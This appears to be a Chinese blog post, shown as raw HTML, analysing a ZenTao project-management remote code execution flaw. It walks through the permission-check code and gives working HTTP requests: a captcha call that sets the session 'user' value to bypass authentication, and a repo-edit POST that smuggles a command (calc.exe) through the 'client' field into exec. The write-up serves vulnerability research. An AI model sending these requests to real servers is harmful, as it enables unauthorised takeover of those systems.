

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="https://my-hexo-z.oss-cn-beijing.aliyuncs.com/images/bitbug_favicon.ico">
  <link rel="icon" href="https://my-hexo-z.oss-cn-beijing.aliyuncs.com/images/bitbug_favicon.ico">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="John Doe">
  <meta name="keywords" content="">
  
    <meta name="description" content="漏洞概况近日，X步在线通过“X漏洞奖励计划”获取到禅道研发项目管理系统命令注入漏洞的0day相关漏洞情报，攻击者可以通过利用权限绕过结合后台命令执行，导致系统被攻击与控制。 从发布漏洞详情中了解到，此次漏洞是权限绕过加后台命令执行造成的RCE。 禅道项目管理系统未授权RCE分析记录 - magic_zero - 博客园 从漏洞简介处得知需要进行权限绕过、后台命令执行，我们先从权限绕过这部分开始。从">
<meta property="og:type" content="article">
<meta property="og:title" content="禅道研发项目管理系统命令注">
<meta property="og:url" content="http://example.com/2023/01/07/%E7%A6%85%E9%81%93%E6%BC%8F%E6%B4%9E/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:description" content="漏洞概况近日，X步在线通过“X漏洞奖励计划”获取到禅道研发项目管理系统命令注入漏洞的0day相关漏洞情报，攻击者可以通过利用权限绕过结合后台命令执行，导致系统被攻击与控制。 从发布漏洞详情中了解到，此次漏洞是权限绕过加后台命令执行造成的RCE。 禅道项目管理系统未授权RCE分析记录 - magic_zero - 博客园 从漏洞简介处得知需要进行权限绕过、后台命令执行，我们先从权限绕过这部分开始。从">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://img1.baidu.com/it/u=3564776265,213742132&fm=253&fmt=auto&app=120&f=JPEG?w=798&h=500">
<meta property="article:published_time" content="2023-01-07T05:44:20.000Z">
<meta property="article:modified_time" content="2023-11-27T12:38:11.594Z">
<meta property="article:author" content="John Doe">
<meta property="article:tag" content="Web安全">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://img1.baidu.com/it/u=3564776265,213742132&fm=253&fmt=auto&app=120&f=JPEG?w=798&h=500">
  
  
  
  <title>禅道研发项目管理系统命令注 - Hexo</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  


  
<meta name="generator" content="Hexo 6.3.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>追的博客</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                <span>首页</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                <span>归档</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                <span>分类</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                <span>标签</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                <span>关于</span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="禅道研发项目管理系统命令注"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2023-01-07 13:44" pubdate>
          2023年1月7日 下午
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          12k 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          99 分钟
        
      </span>
    

    
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <h1 id="seo-header">禅道研发项目管理系统命令注</h1>
            
            
              <div class="markdown-body">
                
                <h3 id="漏洞概况"><a href="#漏洞概况" class="headerlink" title="漏洞概况"></a>漏洞概况</h3><p>近日，X步在线通过“X漏洞奖励计划”获取到禅道研发项目管理系统命令注入漏洞的0day相关漏洞情报，攻击者可以通过利用权限绕过结合后台命令执行，导致系统被攻击与控制。</p>
<p>从发布漏洞详情中了解到，此次漏洞是<strong>权限绕过</strong>加<strong>后台命令执行</strong>造成的RCE<strong>。</strong></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/magic-zero/p/17055893.html">禅道项目管理系统未授权RCE分析记录 - magic_zero - 博客园</a></p>
<p>从漏洞简介处得知需要进行权限绕过、后台命令执行，我们先从权限绕过这部分开始。<br>从官网安装禅道<br><img src="D:\文档\分析\img\1677051840056-1e79e1db-6f52-42f5-ad61-592b37222048.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>首先定位到权限验证方法 <code>module/common/model.php-&gt;checkPriv()</code><br><img src="D:\文档\分析\img\1677052081998-626fb210-d4a4-4076-bd3c-dc6168c87730.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>方法介绍翻译：<br>检查用户是否有权限访问此方法，如果没有，则定位到登录页面或拒绝页面。</p>
<p>让我们来对<code>checkPriv()</code>方法具体分析</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs c">获取模块、方法<br><br><span class="hljs-keyword">if</span>判断 获取不到<br>  就获取原始模块、方法<br><br>定义了一个变量中含有三个数组  <br>  user -&gt; <span class="hljs-string">&#x27;拒绝&#x27;</span>，<span class="hljs-string">&#x27;注销&#x27;</span><br>  my  -&gt; <span class="hljs-string">&#x27;更改密码&#x27;</span><br><span class="hljs-string">&#x27;message&#x27;</span> -&gt; ajax获取信息<br><br><span class="hljs-keyword">if</span> 判断 <br>  检查modifyPassword变量是否为空 并且 <br>  检查$beforeValidMethods[$module]变量是否设置并为空 或者 <br>  检查$beforeValidMethods数组中是否存在方法<br><br><span class="hljs-keyword">if</span> 判断<br>  判断用户是否登录。$server来获取用户和$_cookie识别用户<br><br><span class="hljs-keyword">if</span> 判断模块是否开放？<br><br><span class="hljs-keyword">if</span> 判断 <br>  this-&gt;app-&gt;user 非空<br><br>  进行一个赋值<br>  ！$this-&gt;app-&gt;user = $this-&gt;session-&gt;user;<br><br>  <span class="hljs-keyword">if</span> 判断<br>      检查用户是否可以访问X模块、X方法权限，检查是否为正确的session<br>	  用户session判断为非（错误用户），进入下一步判断。<br>	   <span class="hljs-keyword">if</span> 判断<br>		   模块 == <span class="hljs-string">&#x27;story&#x27;</span> 和 url传递参数(<span class="hljs-string">&#x27;storytype&#x27;</span>) 非空 和 查找字符串(<span class="hljs-string">&#x27;,story,requirement,&#x27;</span>，&#123;$this-&gt;app-&gt;params[<span class="hljs-string">&#x27;storyType&#x27;</span>]&#125;判断字符串在多少位 url参数中查询) 查询结果要等与 ==<span class="hljs-literal">true</span><br>           模块 = $this-&gt;app-&gt;params[<span class="hljs-string">&#x27;storyType&#x27;</span>]<br>       调用 deny方法($module,$method)<br>  <span class="hljs-comment">//判断 session正确 正常执行下面流程</span><br>  <span class="hljs-keyword">else</span> <br>	  获取原始请求以及参数<br>		<span class="hljs-keyword">if</span> 如果模块等于<span class="hljs-string">&#x27;message&#x27;</span>和方法等于<span class="hljs-string">&#x27;ajaxgetmessage&#x27;</span><br>			uri = 访问模块链接<br>		elseif 检查是否为ajax请求，<span class="hljs-number">301</span>跳转<br>           返回结果信息为<span class="hljs-literal">false</span>，错误 login timetou，并退出当前脚本<br>		将原始请求、参数转换为安全的base64编码<br>		<span class="hljs-comment">//跳转到指定页面，user-&gt;login方法，并推出当前脚本。</span><br><br><span class="hljs-comment">//异常处理</span><br><br><br></code></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c">    public function <span class="hljs-title function_">mergeParams</span><span class="hljs-params">($defaultParams, $passedParams)</span><br>    &#123;<br>        <span class="hljs-keyword">if</span>(isset($_GET[<span class="hljs-string">&#x27;project&#x27;</span>])) $this-&gt;session-&gt;<span class="hljs-built_in">set</span>(<span class="hljs-string">&#x27;project&#x27;</span>, $_GET[<span class="hljs-string">&#x27;project&#x27;</span>]);<br>        <span class="hljs-comment">/* If the isFlow is true, reset the passed params. */</span><br><br>        <span class="hljs-comment">/* display参数用来标记请求是否来自禅道客户端的卡片展示页面，此处应该删掉以避免对方法调用产生影响。 */</span><br>        <span class="hljs-comment">/* The display parameter is used to mark whether the request comes from the card display page of the ZenTao client. It should be deleted here to avoid affecting the method call. */</span><br>        unset($passedParams[<span class="hljs-string">&#x27;display&#x27;</span>]);<br><br>        $this-&gt;rawParams = parent::mergeParams($defaultParams, $passedParams);<br>        <span class="hljs-keyword">return</span> $this-&gt;rawParams;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python">按PHP_AUTH_USER识别用户。<br>public function identifyByPhpAuth()<br>    &#123;<br>        $account  = $this-&gt;server-&gt;php_auth_user;<br>        $password = $this-&gt;server-&gt;php_auth_pw;<br>        $user     = $this-&gt;identify($account, $password);<br>        <span class="hljs-keyword">if</span>(!$user) <span class="hljs-keyword">return</span> false;<br><br>        $user-&gt;rights = $this-&gt;authorize($account);<br>        $user-&gt;groups = $this-&gt;getGroups($account);<br>        $user-&gt;view   = $this-&gt;grantUserView($user-&gt;account, $user-&gt;rights[<span class="hljs-string">&#x27;acls&#x27;</span>]);<br>        $this-&gt;session-&gt;<span class="hljs-built_in">set</span>(<span class="hljs-string">&#x27;user&#x27;</span>, $user);<br>        $this-&gt;app-&gt;user = $this-&gt;session-&gt;user;<br>        $this-&gt;loadModel(<span class="hljs-string">&#x27;action&#x27;</span>)-&gt;create(<span class="hljs-string">&#x27;user&#x27;</span>, $user-&gt;<span class="hljs-built_in">id</span>, <span class="hljs-string">&#x27;login&#x27;</span>);<br>        $this-&gt;loadModel(<span class="hljs-string">&#x27;score&#x27;</span>)-&gt;create(<span class="hljs-string">&#x27;user&#x27;</span>, <span class="hljs-string">&#x27;login&#x27;</span>);<br>        $this-&gt;loadModel(<span class="hljs-string">&#x27;common&#x27;</span>)-&gt;loadConfigFromDB();<br>    &#125;<br><br>$account 获取user<br>$password 获取密码<br><br>identify 标识用户<br><br></code></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python">public function identify($account, $password)<br>    &#123;<br>        // 非空返回<br>        <span class="hljs-keyword">if</span>(!$account <span class="hljs-keyword">or</span> !$password) <span class="hljs-keyword">return</span> false;<br>        /* Check account rule <span class="hljs-keyword">in</span> login.  */<br>	<br>        <span class="hljs-keyword">if</span>(!validater::checkAccount($account)) <span class="hljs-keyword">return</span> false;<br><br>        /* Get the user first. If $password length <span class="hljs-keyword">is</span> <span class="hljs-number">32</span>, don<span class="hljs-string">&#x27;t add the password condition.  */</span><br><span class="hljs-string">        $record = $this-&gt;dao-&gt;select(&#x27;</span>*<span class="hljs-string">&#x27;)-&gt;from(TABLE_USER)</span><br><span class="hljs-string">            -&gt;where(&#x27;</span>account<span class="hljs-string">&#x27;)-&gt;eq($account)</span><br><span class="hljs-string">            -&gt;beginIF(strlen($password) &lt; 32)-&gt;andWhere(&#x27;</span>password<span class="hljs-string">&#x27;)-&gt;eq(md5($password))-&gt;fi()</span><br><span class="hljs-string">            -&gt;andWhere(&#x27;</span>deleted<span class="hljs-string">&#x27;)-&gt;eq(0)</span><br><span class="hljs-string">            -&gt;fetch();</span><br><span class="hljs-string"></span><br><span class="hljs-string">        /* If the length of $password is 32 or 40, checking by the auth hash. */</span><br><span class="hljs-string">        $user = false;</span><br><span class="hljs-string"></span><br><span class="hljs-string">checkAccount 检查用户名</span><br></code></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//拒绝访问 方法。</span><br>public function <span class="hljs-title function_">deny</span><span class="hljs-params">($module, $method, $reload = <span class="hljs-literal">true</span>)</span><br>	<span class="hljs-keyword">if</span> 判断<span class="hljs-params">(<span class="hljs-literal">true</span>)</span><br>	   <span class="hljs-comment">//再次获得授权</span><br>		$user = $this-&gt;app-&gt;user;<br>		$user-&gt;权限<br>		进行一些赋值，并检查用户是否允许方法模块、方法、检查session是否正确。<br>    进行一个 referer 返回<br>    修复 ie bug<br>    跳转指定地址<br>    终止并输出，不同于 <span class="hljs-built_in">exit</span>，die。<br>		<br></code></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c">总结一下：权限验证模块<br>主要处的问题再 deny方法<br>	      helper::end();<br>	public <span class="hljs-type">static</span> function <span class="hljs-title function_">end</span><span class="hljs-params">($content = <span class="hljs-string">&#x27;&#x27;)</span></span><br><span class="hljs-string"><span class="hljs-params">    &#123;</span></span><br><span class="hljs-string"><span class="hljs-params">        // 触法异常 EndResponseException（结束响应异常）类::create 方法</span></span><br><span class="hljs-string"><span class="hljs-params">        throw EndResponseException::create($content);</span></span><br><span class="hljs-string"><span class="hljs-params">    &#125;</span></span><br><span class="hljs-string"><span class="hljs-params">没有权限 将会使用 helper::end 抛出异常，不是为 die或exit()程序</span></span><br><span class="hljs-string"><span class="hljs-params">跳到 异常处理 catch</span></span><br><span class="hljs-string"><span class="hljs-params"></span></span><br><span class="hljs-string"><span class="hljs-params">利用：</span></span><br><span class="hljs-string"><span class="hljs-params">  首先保证  $this-&gt;app-&gt;user = $this-&gt;session-&gt;user; 不为空，session的正确</span></span><br><span class="hljs-string"><span class="hljs-params">  然后回检查用户是否被允许访问该模块、方法</span></span><br><span class="hljs-string"><span class="hljs-params">  </span></span><br><span class="hljs-string"><span class="hljs-params"></span></span><br><span class="hljs-string"><span class="hljs-params">漏洞利用关键点：找一个可以生成session-&gt;user 的方法</span></span><br></code></pre></td></tr></table></figure>

<p>搜索 <code>$this-&gt;session-&gt;user</code>，未找到可以调用方法，搜索<code>$this-&gt;session-&gt;</code><br><img src="D:\文档\分析\img\1677676631068-f08d744d-c673-4df6-8803-4790d0707e52.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>找到一个 <code>$this-&gt;session-&gt;set</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">captcha</span>(<span class="hljs-params"><span class="hljs-variable">$sessionVar</span> = <span class="hljs-string">&#x27;captcha&#x27;</span>, <span class="hljs-variable">$uuid</span> = <span class="hljs-string">&#x27;&#x27;</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$obLevel</span> = <span class="hljs-title function_ invoke__">ob_get_level</span>();<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$obLevel</span>; <span class="hljs-variable">$i</span>++) <span class="hljs-title function_ invoke__">ob_end_clean</span>();<br><br>        <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Type: image/jpeg&#x27;</span>);<br>        <span class="hljs-variable">$captcha</span> = <span class="hljs-variable language_">$this</span>-&gt;app-&gt;<span class="hljs-title function_ invoke__">loadClass</span>(<span class="hljs-string">&#x27;captcha&#x27;</span>);<br>        <span class="hljs-variable language_">$this</span>-&gt;session-&gt;<span class="hljs-title function_ invoke__">set</span>(<span class="hljs-variable">$sessionVar</span>, <span class="hljs-variable">$captcha</span>-&gt;<span class="hljs-title function_ invoke__">getPhrase</span>());<br>        <span class="hljs-variable">$captcha</span>-&gt;<span class="hljs-title function_ invoke__">build</span>()-&gt;<span class="hljs-title function_ invoke__">output</span>();<br>    &#125;<br><br></code></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python">GET /www/index.php?m=misc&amp;f=captcha&amp;sessionVar=user&amp;t=html&amp;s=<span class="hljs-number">0.8135980060049282</span> HTTP/<span class="hljs-number">1.1</span><br>Host: <span class="hljs-number">192.168</span><span class="hljs-number">.3</span><span class="hljs-number">.15</span><br>User-Agent: Mozilla/<span class="hljs-number">5.0</span> (Windows NT <span class="hljs-number">10.0</span>; Win64; x64) AppleWebKit/<span class="hljs-number">537.36</span> (KHTML, like Gecko) Chrome/<span class="hljs-number">103.0</span><span class="hljs-number">.5060</span><span class="hljs-number">.53</span> Safari/<span class="hljs-number">537.36</span><br>Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=<span class="hljs-number">0.8</span><br>Referer: http://<span class="hljs-number">192.168</span><span class="hljs-number">.3</span><span class="hljs-number">.15</span>/www/index.php?m=user&amp;f=login&amp;referer=L3d3dy8=<br>Accept-Encoding: gzip, deflate<br>Accept-Language: zh-CN,zh;q=<span class="hljs-number">0.9</span><br>Cookie: zentaosid=potlgh6aolbfrs3jrssu0pjchr; lang=zh-cn; device=desktop; theme=default; windowWidth=<span class="hljs-number">1707</span>; windowHeight=<span class="hljs-number">904</span><br>Connection: close<br><br><br><br></code></pre></td></tr></table></figure>

<p>根据曝光出来的后台RCE接口确认地址<br><code>repo/control.php-&gt;edit()</code>调用了<code>update()</code>调用了<code>checkConnection()</code><br><img src="D:\文档\分析\img\1677811778234-41bc05dd-1c12-434c-a7f7-02c7b1ceee84.png" srcset="/img/loading.gif" lazyload alt="image.png"><br><img src="D:\文档\分析\img\1677822057470-ae292253-0689-4181-9e9d-8dba765b1898.png" srcset="/img/loading.gif" lazyload alt="image.png"><br><img src="D:\文档\分析\img\1677822076906-6aa7a539-666c-4bbd-8b56-c43ee0d71bb8.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>首先先分析<code>edit()</code>方法对应的是什么功能<br>对应后台<code>DevOps</code>代码库功能<br><img src="D:\文档\分析\img\1677822884643-9aeb3f74-04c7-4bc3-9ed9-bdbc7d1a4f38.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>创建一个代码库<br><img src="D:\文档\分析\img\1677831176213-348f75bb-a919-471d-b558-c8a75668d601.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>利用点是编辑代码库功能<br><img src="D:\文档\分析\img\1677831238407-fd3bb5ff-d610-463b-b7c3-e136cff09f20.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>打上断点，跟进代码里<br><img src="D:\文档\分析\img\1677831268386-6722f46f-4857-453f-97c8-7ae7726b3d39.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>一直到<code>checkConnection()</code>方法，对<code>$scm == &#39;Subversion&#39;</code>进行判断<br><img src="D:\文档\分析\img\1677831321168-432e61b6-f8a3-48d3-95eb-1574643f6c16.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>我们修改<code>scm</code>的值，让它进入判断里面，执行这段代码，操纵<code>client</code>变量达到<code>exec</code>进行命令执行</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span>($scm == <span class="hljs-string">&#x27;Subversion&#x27;</span>)<br>       &#123;<br>           <span class="hljs-comment">/* Get svn version. */</span><br>           $versionCommand = <span class="hljs-string">&quot;$client --version --quiet 2&gt;&amp;1&quot;</span>;<br>           exec($versionCommand, $versionOutput, $versionResult);<br></code></pre></td></tr></table></figure>
<p><img src="D:\文档\分析\img\1677831505037-05d66adb-2451-4015-aebc-c92bd3d5bf41.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>成功执行。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c">POST /www/index.php?m=repo&amp;f=edit&amp;repoID=&amp;objectID= HTTP/<span class="hljs-number">1.1</span><br>Host: <span class="hljs-number">192.168</span><span class="hljs-number">.3</span><span class="hljs-number">.15</span><br>Content-Length: <span class="hljs-number">182</span><br>Accept: application/json, text/javascript, *<span class="hljs-comment">/*; q=0.01</span><br><span class="hljs-comment">X-Requested-With: XMLHttpRequest</span><br><span class="hljs-comment">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36</span><br><span class="hljs-comment">Content-Type: application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="hljs-comment">Origin: http://192.168.3.15</span><br><span class="hljs-comment">Referer: http://192.168.3.15/www/index.php?m=repo&amp;f=edit&amp;repoID=1&amp;objectID=0</span><br><span class="hljs-comment">Accept-Encoding: gzip, deflate</span><br><span class="hljs-comment">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="hljs-comment">Cookie: lang=zh-cn; theme=default; goback=%7B%22my%22%3A%22http%3A%5C%2F%5C%2F192.168.3.15%5C%2Fwww%5C%2Findex.php%3Fm%3Duser%26f%3Dlogin%26referer%3DL3d3dy8%3D%22%2C%22project%22%3A%22http%3A%5C%2F%5C%2F192.168.3.15%5C%2Fwww%5C%2Findex.php%3Fm%3Dproject%26f%3Dbrowse%22%2C%22admin%22%3A%22http%3A%5C%2F%5C%2F192.168.3.15%5C%2Fwww%5C%2Findex.php%3Fm%3Dcompany%26f%3Dbrowse%22%7D; zentaosid=viln6ta833u2ibkji9d4hockph; device=desktop; tab=devops; repoBranch=master; windowWidth=1611; windowHeight=908; XDEBUG_SESSION=PHPSTORM</span><br><span class="hljs-comment">Connection: close</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">product%5B%5D=&amp;projects%5B%5D=&amp;SCM=Subversion&amp;serviceHost=&amp;name=q&amp;path=&amp;encoding=&amp;client=calc.exe&amp;account=&amp;password=&amp;encrypt=&amp;acl%5Bgroups%5D%5B%5D=1&amp;acl%5Busers%5D%5B%5D=&amp;desc=&amp;uid=</span><br></code></pre></td></tr></table></figure>

